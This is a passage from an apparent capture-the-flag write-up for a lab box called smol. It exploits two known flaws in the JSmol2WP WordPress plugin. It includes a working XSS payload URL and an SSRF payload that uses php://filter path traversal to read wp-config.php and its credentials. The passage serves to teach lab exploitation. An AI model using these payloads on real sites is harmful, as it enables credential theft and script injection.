We find two vulnerabilities to smol, one that allows us to use XSS and one that allows us to use SSRF to read data on the system. On the referenced pages in the WPScan we also receive the payloads as POC, we only have to adjust the host.
1.  [JSmol2WP <= 1.07](https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e/) - Unauthenticated Cross-Site Scripting (XSS)
2.  [JSmol2WP <= 1.07](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/)_ - Unauthenticated Server Side Request Forgery (SSRF)

If i Exploit [XSS](http://www.smol.thm//wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8)
![image](https://github.com/user-attachments/assets/a596aae1-d0c5-4861-b167-7c395c7b2ab6)

Exploiting [SSRF](http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php) Vulnerability:

exploiting the vulnerbility the wp-config file is loaded here, which could also contain credentials.
